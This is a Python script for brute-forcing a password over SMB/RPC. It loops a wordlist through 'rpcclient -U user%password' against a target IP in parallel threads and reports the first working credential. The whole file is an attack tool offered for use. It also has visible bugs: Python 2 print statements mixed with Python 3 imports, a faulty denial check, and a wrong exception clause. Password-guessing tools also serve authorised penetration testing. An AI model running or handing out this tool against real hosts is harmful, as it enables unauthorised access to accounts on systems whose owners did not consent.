#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
import threading
import subprocess as s
import queue
import sys
import time


class workerthread(threading.Thread):

    def __init__(
        self,
        rhost,
        user,
        q,
        lc,
        ):
        threading.Thread.__init__(self)
        self.rhost = rhost
        self.user = user
        self.q = q
        self.lc = lc

    def run(self):
        while True:
            try:
                pwd = self.q.get().strip('\n')
                out = s.run(['rpcclient', '-U',
                            '{}%{}'.format(self.user, pwd),
                            self.rhost], stdout=s.PIPE, stderr=s.PIPE,
                            encoding='utf-8')

                if ('DENIED' or 'TIMEOUT') not in out.stdout:
                    print 'Success! user:{} pass:{}'.format(self.user,
                            pwd)
                    sys.exit()

                if 'TIMEOUT' in out.stdout:
                    print 'connection issues. exiting.'
                    sys.exit()

                # print the queue size using qsize as queue len gets reduced on every queue.get()

                print '{}/{} - {} failed.'.format(self.q.qsize(),
                        self.lc, pwd)
            except queue.Empty():

                return

            self.q.task_done()


def build_pwd_queue(pwdfile):
    pwdq = queue.Queue()
    linecount = 0
    with open(pwdfile) as fileobj:
        for line in fileobj:
            pwdq.put(line)
            linecount += 1
    return (pwdq, linecount)


if __name__ == '__main__':

    p = argparse.ArgumentParser('Brute force w/ rpcclient')
    p.add_argument('user', help='single username to test')
    p.add_argument('pwdfile', help='path to password file')
    p.add_argument('rhost', help='ip address of target')
    p.add_argument('-t', help='max threads', dest='maxthread',
                   type=int, default=10)
    r = p.parse_args()

    start = time.time()

    (pwdq, lc) = build_pwd_queue(r.pwdfile)  # pass queue object to a variable, this queue object has been filled with passwords
    threadlist = []

    for i in range(r.maxthread):
        worker = workerthread(r.rhost, r.user, pwdq, lc)
        worker.setDaemon(True)
        worker.start()
        threadlist.append(worker)

    pwdq.join()  # Queue.join() to pause until all threads have finished, then continue.

    runtime = round(time.time() - start, 2)
    print 'Runtime: {}s'.format(runtime)
    print 'Finished'
